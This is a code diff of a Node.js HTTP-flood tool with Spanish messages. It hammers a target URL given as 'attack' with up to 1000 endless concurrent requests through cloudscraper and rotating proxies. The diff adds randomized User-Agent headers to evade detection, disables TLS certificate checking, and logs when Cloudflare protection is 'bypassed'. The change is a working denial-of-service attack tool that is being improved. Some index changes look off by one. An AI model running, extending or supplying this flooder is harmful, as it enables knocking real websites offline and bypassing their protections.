@@ -4,7 +4,7 @@ var HttpsProxyAgent = require('https-proxy-agent');
 const cloudscraper = require('cloudscraper');
 const args = require('minimist')(process.argv.slice(2));
 const fs = require('fs');
-
+const userAgents = require('./userAgents').userAgents();
 const site = args['attack'];
 const threads = args['threads'] || 1000;
 const proxy = args['proxy'] == "true";
@@ -12,6 +12,7 @@ const updateproxy = args['updateproxy'] == "true";
 const checkproxy = true;
 let globalProxies = [];
 let useProxy = false;
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
 
 if (typeof site === 'undefined') {
   console.log('Ingresa un url');
@@ -19,7 +20,7 @@ if (typeof site === 'undefined') {
 }
 
 if (isNaN(threads)) {
-  console.log('Ingresa un numero para los thr  infiniteThread();eads');
+  console.log('Ingresa un numero para los threads');
   return;
 }
 
@@ -28,10 +29,18 @@ function getRandomInt(max) {
 }
 
 function createThread() {
-  let options = { uri: site, cloudflareTimeout: 10000 };
+  let options = {
+    uri: site,
+    cloudflareTimeout: 10000,
+    headers: {
+      'User-Agent': userAgents[getRandomInt(userAgents.length - 2)],
+      'Cache-Control': 'private',
+      'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5'
+    },
+  };
 
   if (useProxy) {
-    options.agent = new HttpsProxyAgent(globalProxies[getRandomInt(globalProxies.length)]);
+    options.agent = new HttpsProxyAgent(globalProxies[getRandomInt(globalProxies.length - 1)]);
   }
 
   return cloudscraper(options);
@@ -41,8 +50,9 @@ async function infiniteThread() {
   while (true) {
     try {
       await createThread();
+      console.log("bypassed");
     } catch (e) {
-      
+      console.log(e.name + " => "+ (e.cause || e.statusCode) + ` || type ${e.errorType}`);
     }
   }
 }
@@ -56,7 +66,7 @@ async function loadProxies() {
     return [];
 
   let validProxies = [];
-  for (let index = 0; index < proxies.length; index++) {
+  for (let index = 0; index < proxies.length - 1; index++) {
     const proxy = 'http://' + proxies[index];
     validProxies.push(proxy);
   }
